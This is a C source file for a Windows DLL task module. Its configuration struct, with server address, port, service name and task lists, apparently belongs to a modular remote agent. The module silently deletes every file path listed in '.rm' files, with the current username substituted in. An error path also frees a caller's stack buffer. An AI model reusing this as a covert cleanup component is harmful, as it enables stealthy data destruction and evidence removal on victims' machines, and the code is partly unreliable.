#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>  
#include <stdio.h>
#include <stdlib.h>
#include <wchar.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

#define MAX_PATH_LEN 1024

#define SRV_ADDR_LEN    16
#define SRV_PORT_LEN    6
#define TASK_NAME_LEN   17
#define LIB_NAME_LEN    17
#define MAX_TASKS       10
#define MAX_LIBS        10

typedef struct {
    char name[TASK_NAME_LEN];
    char libs[MAX_LIBS][LIB_NAME_LEN];
    int lib_count;
} Task;

typedef struct {
    char srv_addr[SRV_ADDR_LEN];
    char srv_port[SRV_PORT_LEN];
    char svc_name[MAX_PATH];
    char svc_path[MAX_PATH];
    char libdir[MAX_PATH];
    char tmpdir[MAX_PATH];
    char conf[MAX_PATH];
    char log[MAX_PATH];
    Task tasks[MAX_TASKS];
    int task_count;
    int state;
} Config;

wchar_t* LOG_FILE;

#if defined(CONSOLE_LOGGING)
    #define Log(...) wprintf(__VA_ARGS__)
#else
    #define Log(...) ((void)0)
#endif

int AnsiToUtf16Stat(const char* ansiStr, wchar_t* utf16Str, int bufSize) {

    int utf16Size = MultiByteToWideChar(CP_ACP, 0, ansiStr, -1, NULL, 0);
    
    if (utf16Size == 0) {
        // printf("[-] MultiByteToWideChar failed: %lu\n", GetLastError());
        return 1;
    }

    if (utf16Size > bufSize) {
        // printf("[-] buf capacity is not sufficient for utf16Str\n");
        return 1;
    }

    int result = MultiByteToWideChar(CP_ACP, 0, ansiStr, -1, utf16Str, bufSize);
    if (result == 0) {
        // printf("[-] MultiByteToWideChar failed: %lu\n", GetLastError());
        free(utf16Str);
        return 1;
    }

    return 0;
}

/**
 * Get the current username
 */
BOOL GetCurrentUsername(wchar_t* buffer, DWORD bufferSize) {
    if (!buffer || bufferSize == 0) {
        return FALSE;
    }

    if (GetUserNameW(buffer, &bufferSize)) {
        return TRUE;
    }

    DWORD err = GetLastError();
    if (err == ERROR_INSUFFICIENT_BUFFER) {
        Log(L"[-] Buffer too small for username\n");
    } else {
        Log(L"[-] GetUserNameW failed: %lu\n", err);
    }

    wcscpy_s(buffer, bufferSize, L"Public");
    return FALSE;
}

/**
 * Replace <USERNAME> in a string with the current username
 */
void ReplaceUsername(wchar_t* str, size_t maxLen) {
    wchar_t* pos = wcsstr(str, L"<USERNAME>");
    if (!pos) return;

    wchar_t username[MAX_PATH];
    BOOL status = GetCurrentUsername(username, MAX_PATH);
    if (!status) return;

    wchar_t result[MAX_PATH_LEN];
    size_t prefixLen = pos - str;
    size_t usernameLen = wcslen(username);
    size_t suffixLen = wcslen(pos + 10);

    if (prefixLen + usernameLen + suffixLen + 1 > MAX_PATH_LEN) {
        Log(L"[-] Result too long\n");
        return;
    }

    wcsncpy(result, str, prefixLen);
    result[prefixLen] = L'\0';
    wcscat(result, username);
    wcscat(result, pos + 10);

    wcscpy_s(str, maxLen, result);
}

/**
 * Delete a file with support for long paths
 */
int DeleteFileWithLongPath(const wchar_t* filePath) {
    wchar_t fullPath[MAX_PATH_LEN];

    if (wcsncmp(filePath, L"\\\\?\\", 4) == 0) {
        wcscpy_s(fullPath, MAX_PATH_LEN, filePath);
    } else if (wcsncmp(filePath, L"\\\\", 2) == 0) {
        wsprintfW(fullPath, L"\\\\?\\UNC%s", filePath + 1);
    } else {
        wsprintfW(fullPath, L"\\\\?\\%s", filePath);
    }

    SetFileAttributesW(fullPath, FILE_ATTRIBUTE_NORMAL);

    if (DeleteFileW(fullPath)) {
        Log(L"[+] Deleted: %s\n", filePath);
        return 0;
    } else {
        DWORD err = GetLastError();
        if (err == ERROR_FILE_NOT_FOUND) {
            Log(L"[-] File not found: %s\n", filePath);
        } else if (err == ERROR_ACCESS_DENIED) {
            Log(L"[-] Access denied: %s\n", filePath);
        } else {
            Log(L"[-] Delete error (%lu): %s\n", err, filePath);
        }
        return 1;
    }
}

/**
 * Process a single .rm file
 */
int ProcessRmFile(const wchar_t* rmFilePath) {
    Log(L"\n=== Processing: %s ===\n", rmFilePath);

    HANDLE hFile = CreateFileW(
        rmFilePath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        Log(L"[-] Failed to open file: %lu\n", GetLastError());
        return 1;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        Log(L"[-] Failed to get file size\n");
        CloseHandle(hFile);
        return 1;
    }

    char* ansiData = (char*)malloc(fileSize + 1);
    if (!ansiData) {
        Log(L"[-] Memory allocation failed\n");
        CloseHandle(hFile);
        return 1;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, ansiData, fileSize, &bytesRead, NULL)) {
        Log(L"[-] Failed to read file\n");
        free(ansiData);
        CloseHandle(hFile);
        return 1;
    }

    ansiData[bytesRead] = '\0';
    CloseHandle(hFile);

    int wcharLen = MultiByteToWideChar(CP_UTF8, 0, ansiData, -1, NULL, 0);
    if (wcharLen <= 0) {
        wcharLen = MultiByteToWideChar(CP_ACP, 0, ansiData, -1, NULL, 0);
    }

    wchar_t* wideData = (wchar_t*)malloc(wcharLen * sizeof(wchar_t));
    if (!wideData) {
        free(ansiData);
        return 1;
    }

    MultiByteToWideChar(CP_UTF8, 0, ansiData, -1, wideData, wcharLen);
    free(ansiData);

    wchar_t* context = NULL;
    wchar_t* line = wcstok(wideData, L"\r\n", &context);
    int deletedCount = 0;
    int totalCount = 0;

    while (line) {
        while (*line == L' ' || *line == L'\t') line++;

        if (*line == L'#' || *line == L'\0') {
            line = wcstok(NULL, L"\r\n", &context);
            continue;
        }

        totalCount++;

        wchar_t path[MAX_PATH_LEN];
        wcscpy_s(path, MAX_PATH_LEN, line);
        ReplaceUsername(path, MAX_PATH_LEN);

        if (DeleteFileWithLongPath(path) == 0) {
            deletedCount++;
        }

        line = wcstok(NULL, L"\r\n", &context);
    }

    free(wideData);

    Log(L"[+] Deleted: %d of %d files\n", deletedCount, totalCount);
    return 0;
}

/**
 * Find all .rm files in a directory and process them
 */
void FindAndProcessRmFiles(const wchar_t* directory) {
    wchar_t searchPath[MAX_PATH_LEN];
    wsprintfW(searchPath, L"%s\\*.rm", directory);

    Log(L"Searching for .rm files in: %s\n", directory);

    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW(searchPath, &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        if (err == ERROR_FILE_NOT_FOUND) {
            Log(L"[-] No .rm files found\n");
        } else {
            Log(L"[-] Search error: %lu\n", err);
        }
        return;
    }

    int fileCount = 0;
    do {
        if (wcscmp(findData.cFileName, L".") == 0 ||
            wcscmp(findData.cFileName, L"..") == 0) {
            continue;
        }

        if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            wchar_t fullPath[MAX_PATH_LEN];
            wsprintfW(fullPath, L"%s\\%s", directory, findData.cFileName);

            Log(L"\n[%d] Found: %s\n", ++fileCount, fullPath);
            ProcessRmFile(fullPath);
        }
    } while (FindNextFileW(hFind, &findData));

    FindClose(hFind);

    if (fileCount == 0) {
        Log(L"[-] No .rm files found\n");
    } else {
        Log(L"\n[+] Processed %d .rm files\n", fileCount);
    }
}

int RmProcess(wchar_t* rmdir) {
    Log(L"=== File Cleaner (Automatic Mode) ===\n");
    Log(L"Search directory: %s\n\n", rmdir);

    DWORD attrs = GetFileAttributesW(rmdir);
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        Log(L"[-] Directory not found: %s\n", rmdir);
        return 1;
    }
    if (!(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        Log(L"[-] Path is not a directory\n");
        return 1;
    }

    FindAndProcessRmFiles(rmdir);

    Log(L"\nDone. Press any key to exit...\n");
    getchar();
    return 0;
}


__declspec(dllexport) int WINAPI TaskMain(
    int argc, void** argv
)
{
    Log(L"TaskMain started\n");

    if (argc != 2) {
        Log(L"[-] argc != 2\n");
        return 1;
    }

    Config* cfg = (Config*)argv[1];
    wchar_t log_file[MAX_PATH];
    if (AnsiToUtf16Stat(cfg->log, log_file, MAX_PATH)) {
        Log(L"[-] AnsiToUtf16Stat failed %hs\n", cfg->log);
        return 1;
    }
    LOG_FILE = log_file;

    wchar_t libdir[MAX_PATH];
    if (AnsiToUtf16Stat(cfg->libdir, libdir, MAX_PATH)) {
        Log(L"[-] AnsiToUtf16Stat failed: %hs\n", cfg->libdir);
        return 1;
    }

    Log(L"[*] libdir: %s\n", libdir);

    return RmProcess(libdir);
}